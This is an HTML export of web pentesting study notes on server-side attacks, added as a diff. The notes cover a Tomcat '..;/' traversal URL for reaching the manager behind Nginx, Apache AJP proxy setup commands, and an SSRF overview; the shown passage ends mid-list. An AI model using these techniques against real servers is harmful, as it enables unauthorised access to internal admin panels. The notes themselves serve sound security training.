@@ -1,0 +1,1069 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Server Side Attacks</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="6bafb31c-5225-4238-8fab-7af8bced97ee" class="page mono"><header><h1 class="page-title"><strong>Server Side Attacks</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="1348e6b4-e37b-4c92-b892-fddc669bb66b" class=""><strong>Server-Side Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#server-side-attacks"></a></strong></h1><ul id="33d6deb1-7cdc-4728-905b-a5bee98bc062" class="bulleted-list"><li style="list-style-type:disc">Server-Side Request Forgery</li></ul><ul id="361b2951-af7f-4146-97e3-44b0d88bf8d1" class="bulleted-list"><li style="list-style-type:disc">Server-Side Include</li></ul><ul id="9ba3ba94-b98d-40ed-b178-b8aa58e6b6cc" class="bulleted-list"><li style="list-style-type:disc">Language Evaluation</li></ul><ul id="681f82c0-bfe0-4841-bad2-3d808c19214f" class="bulleted-list"><li style="list-style-type:disc">Attacking XSLT Engines</li></ul><p id="2ae79dc0-2229-4796-a5dc-eb429696ed11" class="">Objectives:</p><ul id="7fb13249-145d-4f6c-a861-4ad97c703de7" class="bulleted-list"><li style="list-style-type:disc">Understanding how user input can be handled by back-end logic</li></ul><ul id="1568d0f5-8a69-4853-a7b8-271cb7368ac7" class="bulleted-list"><li style="list-style-type:disc">Finding and Exploiting Server-Side bugs</li></ul><h2 id="c550a826-46f5-437c-b550-79a4b8b0a5a4" class=""><strong>Abusing Intermediate Devices</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#abusing-intermediate-devices"></a></strong></h2><p id="ed59a1e8-f1b0-4265-a9d8-f31e6ad76366" class="">When Tomcat is combined with a Nginx reverse proxy, an insecure condition may occur; This is because Tomcat itself will treat <strong>..;/</strong> as if it was a parent directory traversal sequence <strong>../</strong> and normalize (sanitize) that sequence.</p><ul id="a6e8a9af-690f-420f-9ebf-0852f682d2d5" class="bulleted-list"><li style="list-style-type:disc">However, when relying on the reverse proxy For this task, the proxy might not do that, allowing For escaping <strong>up one directory</strong> because they will pass that path to Tomcat unchanged, and Tomcat will not perform additional validation since it relies on the reverse proxy to do it.</li></ul><p id="4eba078b-7edd-47c4-80a9-f98b984478e2" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c25ad4c0-a9ef-4b72-b165-45ad6cafd998" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://tomcatapplication.com/..;/manager/html
+
+# might reveal the Tomcat Manager
+</code></pre><p id="442a7172-7413-465f-99ec-525a216281e8" class="">Another opportunity to access the hidden Tomcat manager is <em>AJP Proxy</em>.</p><ul id="be13a69d-46de-426b-b97e-eeed41ec425a" class="bulleted-list"><li style="list-style-type:disc">Usually running on port 8009 and is accompanied by Tomcat-based websites.</li></ul><ul id="87f54088-2b19-4af9-a9cf-0b67280578e7" class="bulleted-list"><li style="list-style-type:disc">ajp13 is not a web app, its a binary protocol</li></ul><ul id="29b56765-9b1f-46a6-8321-64c029b94e80" class="bulleted-list"><li style="list-style-type:disc">However, ajp proxy might be a gateway to internal resources (administrative panels or unpublished websites)</li></ul><p id="5dd1ceb0-85f8-4be7-888d-f5ccc98699a8" class="">To connect to a remote ajp port, u need to have Apache installed on your system</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1caf3fc4-ebba-4f87-9147-1d473e4371ff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">apt-get install apache2
+</code></pre><p id="1272aede-19c4-4102-ae54-6f34d5229b36" class="">Then u need to install the ajp-related module:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ba56cd52-2737-4ecb-b1b7-b83e18b82fa8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">apt install libapache2-mod-jk
+</code></pre><p id="fb913e41-a2c1-4bce-98be-df4a78d8fe07" class="">And enable it:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="82dda835-0d5b-43a7-8152-9a88af1fcec3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">a2enmod proxy_ajp
+</code></pre><p id="3fc5dae4-90fe-47a2-97fe-3fc1032f4f3d" class="">Create a file path under the path: /etc/apache2/sites-enabled/ajp.conf</p><figure id="23e22918-3bc1-4b10-ba00-9a2300a838ee" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/59.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/59.png"/></a></figure><p id="e07c1616-34d6-4c1f-a741-e948ed0c8513" class="">Then restart apache. it should be able to visit the remote website at http://127.0.0.1.</p><blockquote id="2778f4e6-e220-4322-a78a-fd07d6c13fd8" class="">Since the real web app server is hidden deep inside its infrastructure, the ability to know its real IP address can be a vuln itself.</blockquote><blockquote id="359fd217-17e6-4113-94c7-ac8cd3c81686" class="">It could be even better if one is able to issue a request on behalf of that server or in the most complex case, retrieve the results of such requests</blockquote><h2 id="031a34d0-f3d3-4a08-9690-60a6006a184b" class=""><strong>SSRF Attack</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#ssrf-attack"></a></strong></h2><p id="4c81e6ae-b528-44f5-aa30-b7e56030703b" class="">Server-Side request forgery is an attack in which the user is able to make the application server (or a proxy or another part of its infra) issue a request For external resources</p><p id="55c6f06e-677f-4a52-81e7-24a189d00728" class="">The exploitation of SSRF can lead to:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28c012da-8d43-4069-97c1-7fbaceed48ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Sensitive Information Disclosure
+- Stealing authentication information (Windows NTLM hashes)
+- File read/inclusion
+- Remote Code Execution
+</code></pre><p id="be61952b-f4fd-4b7e-aa33-5dc56695d035" class="">The most obvious places to look For:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="07dc5fdb-9cde-4e80-843a-426e9f261eda" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- in Load profile picture from URL functionalities
+- or similar features
